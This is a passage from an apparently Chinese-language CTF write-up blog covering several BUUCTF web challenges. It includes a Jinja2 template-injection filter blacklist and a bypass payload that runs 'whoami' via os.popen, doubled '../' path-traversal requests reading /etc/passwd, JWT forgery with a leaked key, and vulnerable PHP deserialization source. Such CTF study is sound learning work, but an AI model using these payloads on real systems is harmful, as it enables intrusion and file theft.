class="hljs-string">&#x27;if&#x27;</span>, <span class="hljs-string">&#x27;for&#x27;</span>,<br>                 <span class="hljs-string">&#x27; subprocess&#x27;</span>, <span class="hljs-string">&#x27;file&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>, <span class="hljs-string">&#x27;popen&#x27;</span>, <span class="hljs-string">&#x27;builtins&#x27;</span>, <span class="hljs-string">&#x27;compile&#x27;</span>, <span class="hljs-string">&#x27;execfile&#x27;</span>, <span class="hljs-string">&#x27;from_pyfile&#x27;</span>, <span class="hljs-string">&#x27;local&#x27;</span>,<br>                 <span class="hljs-string">&#x27;self&#x27;</span>, <span class="hljs-string">&#x27;item&#x27;</span>, <span class="hljs-string">&#x27;getitem&#x27;</span>, <span class="hljs-string">&#x27;getattribute&#x27;</span>, <span class="hljs-string">&#x27;func_globals&#x27;</span>, <span class="hljs-string">&#x27;config&#x27;</span>];<br><span class="hljs-keyword">for</span> no <span class="hljs-keyword">in</span> blacklist:<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-keyword">if</span> no <span class="hljs-keyword">in</span> s:<br>            s = s.replace(no, <span class="hljs-string">&#x27;&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">break</span><br><span class="hljs-keyword">return</span> s<br></code></pre></td></tr></table></figure><p>è¿™ä¸œè¥¿ä¼šåœ¨<code>blacklist</code>ä¸­æŒ‰é¡ºåºå–å­—ç¬¦ä¸²ç„¶åæ£€æŸ¥ç”¨æˆ·è¾“å…¥ä¸­æœ‰æ²¡æœ‰ï¼Œæœ‰çš„è¯æ›¿æ¢æˆç©ºç»§ç»­æ£€æµ‹ç›´åˆ°ä¸å­˜åœ¨ç›®æ ‡å­—ç¬¦ä¸²ï¼Œç„¶åè·³åˆ°ä¸‹ä¸€ä¸ªå…³é”®å­—çš„æ£€æµ‹</p><p><code>config</code>è¿™ä¸œè¥¿è¢«ä»–æ”¾åˆ°æœ€åäº†ï¼Œæ‰€ä»¥å¯ä»¥åœ¨å…³é”®å­—ä¸­é—´æ’å…¥<code>config</code>å®ç°ç»•è¿‡ã€‚</p><p>å½“ç„¶ä¹Ÿå¯ä»¥åˆ†åˆ«å®šä¹‰ï¼š</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">a</span>=<span class="hljs-string">&#x27;__bui&#x27;</span>+&#x27;ltins__&#x27;%&#125;<br>&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">b</span>=<span class="hljs-string">&#x27;__im&#x27;</span>+&#x27;port__&#x27;%&#125;<br>&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">c</span>=<span class="hljs-string">&#x27;o&#x27;</span>+&#x27;s&#x27;%&#125;<br>&#123;%<span class="hljs-built_in">set</span> <span class="hljs-attribute">d</span>=<span class="hljs-string">&#x27;po&#x27;</span>+&#x27;pen&#x27;%&#125;<br>&#123;%<span class="hljs-built_in">print</span>(lipsum[<span class="hljs-string">&#x27;__globals__&#x27;</span>][a][b](c)[d](<span class="hljs-string">&#x27;whoami&#x27;</span>)[<span class="hljs-string">&#x27;read&#x27;</span>]())%&#125;<br></code></pre></td></tr></table></figure><h4 id="æ€è·¯æ€»ç»“ï¼š-4"><a href="#æ€è·¯æ€»ç»“ï¼š-4" class="headerlink" title="æ€è·¯æ€»ç»“ï¼š"></a>æ€è·¯æ€»ç»“ï¼š</h4><p><code>&#123;&#123;&#125;&#125;</code>ç»•è¿‡ï¼Œ<code>lipsum</code>æ–¹æ³•ã€‚</p><p><a href="https://xz.aliyun.com/t/6885?time__1311=n4+xnD0DRDyB5q053b7Yi=YG=kphrOqD5x&alichlgref=https://xz.aliyun.com/t/6885#toc-4">å‚è€ƒæ–‡ç« </a></p><p><a href="https://www.cnblogs.com/2ha0yuk7on/p/16648850.html#%E5%B8%B8%E8%A7%84%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF">å‚è€ƒæ–‡ç« </a></p><p><a href="https://www.cnblogs.com/Article-kelp/p/14797393.html">å‚è€ƒæ–‡ç« </a></p><h2 id="BSidesCF-2020-Hurdles"><a href="#BSidesCF-2020-Hurdles" class="headerlink" title="[BSidesCF 2020]Hurdles"></a>[BSidesCF 2020]Hurdles</h2><p><code>/hurdles</code>:</p><p><img src="/img/BSidesCF2020Hurdles2.png" alt="BSidesCF2020Hurdles2"></p><p>æŠ“åŒ…ä¿®æ”¹è¯·æ±‚æ–¹å¼<code>PUT</code>:</p><p><img src="/img/BSidesCF2020Hurdles3.png" alt="BSidesCF2020Hurdles3"></p><p><code>/hurdles/!</code></p><p><img src="/img/BSidesCF2020Hurdles4.png" alt="BSidesCF2020Hurdles4"></p><p><code>PUT /hurdles/!?get=flag</code></p><p><img src="/img/BSidesCF2020Hurdles5.png" alt="BSidesCF2020Hurdles5"></p><p><code>/hurdles/!?get=flag&amp;%26%3D%26%3D%26=1</code>æ³¨æ„è¿™é‡Œè¦ç»™ä»–<code>URL</code>ç¼–ç ã€‚ã€‚ã€‚</p><p><img src="/img/BSidesCF2020Hurdles6.png" alt="BSidesCF2020Hurdles6"></p><p><code>/hurdles/!?get=flag&amp;%26%3d%26%3d%26=%2500%0A</code>æ³¨æ„è¿™é‡Œ<code>%25</code>æ˜¯<code>%</code>çš„<code>URL</code>ç¼–ç ï¼Œåé¢è¿˜è¦åŠ ä¸ª<code>%0A</code>æ¢è¡Œç¬¦ã€‚</p><p><img src="/img/BSidesCF2020Hurdles7.png" alt="BSidesCF2020Hurdles7"></p><p>æ·»åŠ <code>Authorization: Basic cGxheWVyOjEyMzQ1Ng==</code>å­—æ®µå³å¯ã€‚</p><p>å½“ç„¶ä¹Ÿå¯ä»¥ç”¨<code>curl</code>è¿™ä¸ªå·¥å…·ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">curl</span> -X PUT &#x27;http://node5.buuoj.cn:<span class="hljs-number">26300</span>/hurdles/!?get=flag&amp;%<span class="hljs-number">26</span>%<span class="hljs-number">3</span>D%<span class="hljs-number">26</span>%<span class="hljs-number">3</span>D%<span class="hljs-number">26</span>=%<span class="hljs-number">2500</span>%<span class="hljs-number">0</span>a&#x27; -u &#x27;player:<span class="hljs-number">123456</span>&#x27;<br></code></pre></td></tr></table></figure><blockquote><p>Iâ€™m sorry, Basically, I was expecting the password of the hex representation of the md5 of the string â€˜open sesameâ€™</p></blockquote><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">curl</span> -X PUT &#x27;http://node5.buuoj.cn:<span class="hljs-number">26300</span>/hurdles/!?get=flag&amp;%<span class="hljs-number">26</span>%<span class="hljs-number">3</span>D%<span class="hljs-number">26</span>%<span class="hljs-number">3</span>D%<span class="hljs-number">26</span>=%<span class="hljs-number">2500</span>%<span class="hljs-number">0</span>a&#x27; -u &#x27;player:<span class="hljs-number">54</span>ef36ec71201fdf9d1423fd26f97f6b&#x27;<br></code></pre></td></tr></table></figure><blockquote><p>Iâ€™m sorry, I was expecting you to be using a 1337 Browser.</p></blockquote><p>åé¢æ‡’å¾—å†™äº†ï¼š</p><p><img src="/img/BSidesCF2020Hurdles8.png" alt="BSidesCF2020Hurdles8"></p><h4 id="æ€è·¯æ€»ç»“-5"><a href="#æ€è·¯æ€»ç»“-5" class="headerlink" title="æ€è·¯æ€»ç»“"></a>æ€è·¯æ€»ç»“</h4><p><code>X-Forwarded-For</code>å®é™…å¯èƒ½æœ‰å¤šä¸ªï¼Œç¬¬ä¸€é¡¹æ˜¯çœŸå®çš„<code>IP</code>;æ³¨æ„<code>URL</code>ç¼–ç ã€‚<code>Authorization</code>è®¤è¯å¤´éœ€è¦<code>base64</code>ç¼–ç ã€‚</p><h2 id="DDCTF-2019-homebrew-event-loop"><a href="#DDCTF-2019-homebrew-event-loop" class="headerlink" title="[DDCTF 2019]homebrew event loop"></a>[DDCTF 2019]homebrew event loop</h2><p>ç¯å¢ƒæ‰“ä¸å¼€ï¼Œåé¢åœ¨åš</p><h2 id="virink-2019-files-share"><a href="#virink-2019-files-share" class="headerlink" title="virink_2019_files_share"></a>virink_2019_files_share</h2><p><img src="/img/virink_2019_files_share1.png" alt="virink_2019_files_share1"></p><p><code>URL</code>å‰åŠ <code>view-source</code>å­—æ®µçœ‹çœ‹ï¼š</p><p><img src="/img/virink_2019_files_share2.png" alt="virink_2019_files_share2"></p><p><img src="/img/virink_2019_files_share3.png" alt="virink_2019_files_share3"></p><p><img src="/img/virink_2019_files_share5.png" alt="virink_2019_files_share5"></p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs groovy"><span class="hljs-regexp">/preview?f=/</span>etc/passwd<br>&#123;<span class="hljs-string">&quot;msg&quot;</span>:<span class="hljs-string">&quot;File \/epasswd not found!&quot;</span>,<span class="hljs-string">&quot;code&quot;</span>:<span class="hljs-number">1</span>&#125;   è¿‡æ»¤äº†tc/ <br>è¿‡æ»¤äº†../<br>preview?f=<span class="hljs-regexp">/.../</span>.<span class="hljs-regexp">/.../</span>.<span class="hljs-regexp">/.../</span>.<span class="hljs-regexp">/.../</span>.<span class="hljs-regexp">/.../</span>.<span class="hljs-regexp">/.../</span>.<span class="hljs-regexp">/etctc/</span><span class="hljs-regexp">/passwdå¯ä»¥è¯»/</span>etc/passwd<br>å…¶å®å°±æ˜¯ç®€å•çš„æ›¿æ¢ä¸ºç©ºï¼ŒåŒå†™å°±èƒ½ç»•è¿‡<br>ç„¶åç›®å½•éå†æ‹¿flagï¼Œä¸è¿‡è¿™ä¸ªflagåœ¨ç›®æ ‡æ–‡ä»¶å¤¹ä¸‹<br>æµ‹è¯•çš„æ—¶å€™å‘ç°å•ç‹¬ä¸€ä¸ª/ä¹Ÿä¼šè¢«è¿‡æ»¤ï¼Œä¸è¿‡å†™æˆï¼š<br>preview?f=<span class="hljs-regexp">/.../</span>.<span class="hljs-regexp">/.../</span>.<span class="hljs-regexp">/.../</span>.<span class="hljs-regexp">/.../</span>.<span class="hljs-regexp">/.../</span>.<span class="hljs-regexp">/.../</span>.<span class="hljs-regexp">/f1ag_Is_h3re../</span>/flag<br>è¿˜æ˜¯èƒ½è¯»flagã€‚ã€‚æ„Ÿè§‰ä»–è¿™ä¸ªè¿‡æ»¤è§„åˆ™æŒºå¥‡æ€ªçš„<br><br></code></pre></td></tr></table></figure><h4 id="æ€è·¯æ€»ç»“-6"><a href="#æ€è·¯æ€»ç»“-6" class="headerlink" title="æ€è·¯æ€»ç»“"></a>æ€è·¯æ€»ç»“</h4><p>ç›®å½•éå†ï¼Œ<code>/uploads/</code></p><h2 id="å®‰æ´µæ¯-2019-iamthinking"><a href="#å®‰æ´µæ¯-2019-iamthinking" class="headerlink" title="[å®‰æ´µæ¯ 2019]iamthinking"></a>[å®‰æ´µæ¯ 2019]iamthinking</h2><p><code>/public/</code>å‘ç°æ˜¯å¼ å›¾ç‰‡</p><h2 id="RootersCTF2019-ImgXweb"><a href="#RootersCTF2019-ImgXweb" class="headerlink" title="[RootersCTF2019]ImgXweb"></a>[RootersCTF2019]ImgXweb</h2><p>æ–‡ä»¶ä¸Šä¼ ï¼Œæ³¨å†Œè´¦å·æ—¶å‘ç°<code>admin</code>å·²ç»å­˜åœ¨ã€‚éšä¾¿æ³¨å†Œä¸€ä¸ªå‘ç°æ˜¯æ–‡ä»¶ä¸Šä¼ ã€‚å¯ä»¥ä¸Šä¼ å›¾ç‰‡ç”šè‡³<code>php</code>æ–‡ä»¶ï¼Œä¸è¿‡ä¸Šä¼ ä¹‹åæ‰¾ä¸åˆ°æ–‡ä»¶è·¯å¾„ï¼Œåªä¼šæ˜¾ç¤ºè¿™ä¹ˆä¸ªä¸œè¥¿ï¼š</p><p><img src="/img/imgxweb2.png" alt="imgxweb2"></p><p>æœ¬æ¥æƒ³ç€æŠ“åŒ…çœ‹ä¸‹<code>php</code>æ–‡ä»¶ä¸Šä¼ åˆ°å“ªäº†ï¼Œç»“æœå‘ç°è¿™ä¹ˆä¸ªä¸œè¥¿ï¼š</p><p><img src="/img/imgxweb1.png" alt="imgxweb1"></p><p>è¿™ä¸œè¥¿çœ‹ç€åƒ<code>JWT</code>ï¼Œæ‹¿ç€å»è§£ä¸€ä¸‹ï¼š</p><p><img src="/img/imgxweb4.png" alt="imgxweb4"></p><p>ç»™äº†æ³¨å†Œçš„ç”¨æˆ·åï¼Œåˆæ­¥åˆ¤æ–­<code>JWT</code>ä¼ªé€ ä¸ª<code>admin</code>ï¼Œç°åœ¨è¦æ‰¾<code>secret_key</code></p><p>è®¿é—®<code>robots.txt</code>ç›´æ¥ç»™äº†<code>/static/secretkey.txt</code>ï¼Œé‡Œé¢æ˜¯è¿™ä¹ˆä¸ªä¸œè¥¿ï¼š</p><p><code>you-will-never-guess</code></p><p>å—çš„ï¼Œä»–ä¸€å¼€å§‹é‡Œé¢è¿™ä¹ˆå†™æˆ‘è¿˜ä»¥ä¸ºè¿™æ˜¯ä¸ªå‡çš„å¯†é’¥ï¼Œæƒ³äº†åŠå¤©æ€ä¹ˆå»å¼„çœŸçš„ç»“æœçœ‹äº†<code>wp</code>å‘ç°å°±æ˜¯ç”¨è¿™ä¸ªã€‚ã€‚TAT</p><p>åé¢å°±æ˜¯æ”¹<code>session_id</code>ç„¶åä¼šå‡ºç°<code>flag.png</code>è¿™ä¸ªä¸œè¥¿ï¼Œç›´æ¥è®¿é—®å¯¹åº”è·¯å¾„å°±è¡Œã€‚</p><h4 id="æ€è·¯æ€»ç»“-7"><a href="#æ€è·¯æ€»ç»“-7" class="headerlink" title="æ€è·¯æ€»ç»“"></a>æ€è·¯æ€»ç»“</h4><p><code>JWT</code>ä¼ªé€ </p><h2 id="2020-æ–°æ˜¥çº¢åŒ…é¢˜-1"><a href="#2020-æ–°æ˜¥çº¢åŒ…é¢˜-1" class="headerlink" title="[2020 æ–°æ˜¥çº¢åŒ…é¢˜]1"></a>[2020 æ–°æ˜¥çº¢åŒ…é¢˜]1</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><code class="hljs php">/?src=<span class="hljs-number">1</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$store</span>;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$key</span>;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$expire</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$store</span>, <span class="hljs-variable">$key</span> = <span class="hljs-string">&#x27;flysystem&#x27;</span>, <span class="hljs-variable">$expire</span> = <span class="hljs-literal">null</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;key = <span class="hljs-variable">$key</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;store = <span class="hljs-variable">$store</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;expire = <span class="hljs-variable">$expire</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">cleanContents</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$contents</span></span>) </span>&#123;<br>        <span class="hljs-variable">$cachedProperties</span> = <span class="hljs-title function_ invoke__">array_flip</span>([<br>            <span class="hljs-string">&#x27;path&#x27;</span>, <span class="hljs-string">&#x27;dirname&#x27;</span>, <span class="hljs-string">&#x27;basename&#x27;</span>, <span class="hljs-string">&#x27;extension&#x27;</span>, <span class="hljs-string">&#x27;filename&#x27;</span>,<br>            <span class="hljs-string">&#x27;size&#x27;</span>, <span class="hljs-string">&#x27;mimetype&#x27;</span>, <span class="hljs-string">&#x27;visibility&#x27;</span>, <span class="hljs-string">&#x27;timestamp&#x27;</span>, <span class="hljs-string">&#x27;type&#x27;</span>,<br>        ]);<br><br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$contents</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$path</span> =&gt; <span class="hljs-variable">$object</span>) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$object</span>)) &#123;<br>                <span class="hljs-variable">$contents</span>[<span class="hljs-variable">$path</span>] = <span class="hljs-title function_ invoke__">array_intersect_key</span>(<span class="hljs-variable">$object</span>, <span class="hljs-variable">$cachedProperties</span>);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$contents</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getForStorage</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$cleaned</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">cleanContents</span>(<span class="hljs-variable">$this</span>-&gt;cache);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-variable">$cleaned</span>, <span class="hljs-variable">$this</span>-&gt;complete]);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">save</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$contents</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getForStorage</span>();<br><br>        <span class="hljs-variable language_">$this</span>-&gt;store-&gt;<span class="hljs-title function_ invoke__">set</span>(<span class="hljs-variable">$this</span>-&gt;key, <span class="hljs-variable">$contents</span>, <span class="hljs-variable">$this</span>-&gt;expire);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">$this</span>-&gt;autosave) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">save</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getExpireTime</span>(<span class="hljs-params"><span class="hljs-variable">$expire</span></span>): <span class="hljs-title">int</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-keyword">int</span>) <span class="hljs-variable">$expire</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getCacheKey</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$name</span></span>): <span class="hljs-title">string</span> </span>&#123;<br>        <span class="hljs-comment">// ä½¿ç¼“å­˜æ–‡ä»¶åéšæœº</span><br>        <span class="hljs-variable">$cache_filename</span> = <span class="hljs-variable language_">$this</span>-&gt;options[<span class="hljs-string">&#x27;prefix&#x27;</span>] . <span class="hljs-title function_ invoke__">uniqid</span>() . <span class="hljs-variable">$name</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$cache_filename</span>, -<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-string">&#x27;.php&#x27;</span>)) === <span class="hljs-string">&#x27;.php&#x27;</span>) &#123;<br>          <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;?&#x27;</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$cache_filename</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">serialize</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>): <span class="hljs-title">string</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$data</span>)) &#123;<br>            <span class="hljs-keyword">return</span> (<span class="hljs-keyword">string</span>) <span class="hljs-variable">$data</span>;<br>        &#125;<br><br>        <span class="hljs-variable">$serialize</span> = <span class="hljs-variable language_">$this</span>-&gt;options[<span class="hljs-string">&#x27;serialize&#x27;</span>];<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$serialize</span>(<span class="hljs-variable">$data</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">set</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$value</span>, <span class="hljs-variable">$expire</span> = <span class="hljs-literal">null</span></span>): <span class="hljs-title">bool</span></span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;writeTimes++;<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_null</span>(<span class="hljs-variable">$expire</span>)) &#123;<br>            <span class="hljs-variable">$expire</span> = <span class="hljs-variable language_">$this</span>-&gt;options[<span class="hljs-string">&#x27;expire&#x27;</span>];<br>        &#125;<br><br>        <span class="hljs-variable">$expire</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getExpireTime</span>(<span class="hljs-variable">$expire</span>);<br>        <span class="hljs-variable">$filename</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getCacheKey</span>(<span class="hljs-variable">$name</span>);<br><br>        <span class="hljs-variable">$dir</span> = <span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-variable">$filename</span>);<br><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$dir</span>)) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$dir</span>, <span class="hljs-number">0755</span>, <span class="hljs-literal">true</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (\<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br>                <span class="hljs-comment">// åˆ›å»ºå¤±è´¥</span><br>            &#125;<br>        &#125;<br><br>        <span class="hljs-variable">$data</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$value</span>);<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;options[<span class="hljs-string">&#x27;data_compress&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-string">&#x27;gzcompress&#x27;</span>)) &#123;<br>            <span class="hljs-comment">//æ•°æ®å‹ç¼©</span><br>            <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">gzcompress</span>(<span class="hljs-variable">$data</span>, <span class="hljs-number">3</span>);<br>        &#125;<br><br>        <span class="hljs-variable">$data</span> = <span class="hljs-string">&quot;&lt;?php\n//&quot;</span> . <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&#x27;%012d&#x27;</span>, <span class="hljs-variable">$expire</span>) . <span class="hljs-string">&quot;\n exit();?&gt;\n&quot;</span> . <span class="hljs-variable">$data</span>;<br>        <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$data</span>);<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$filename</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;src&#x27;</span>]))<br>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-variable">$dir</span> = <span class="hljs-string">&quot;uploads/&quot;</span>;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$dir</span>))<br>&#123;<br>    <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$dir</span>);<br>&#125;<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;data&quot;</span>]);<br></code></pre></td></tr></table></figure><h2 id="ç¾ŠåŸæ¯-2020-Blackcat"><a href="#ç¾ŠåŸæ¯-2020-Blackcat" class="headerlink" title="[ç¾ŠåŸæ¯ 2020]Blackcat"></a>[ç¾ŠåŸæ¯ 2020]Blackcat</h2><p>å³é”®æºç ï¼Œ<code>mp3</code>æ–‡ä»¶ä¸­å­˜åœ¨ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;Black-Cat-Sheriff&#x27;</span>]) || <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;One-ear&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;è°ï¼ç«Ÿæ•¢è¸©æˆ‘ä¸€åªè€³çš„å°¾å·´ï¼&#x27;</span>);<br>&#125;<br><br><span class="hljs-variable">$clandestine</span> = <span class="hljs-title function_ invoke__">getenv</span>(<span class="hljs-string">&quot;clandestine&quot;</span>);<br><br><span class="hljs-keyword">if</span>(<span 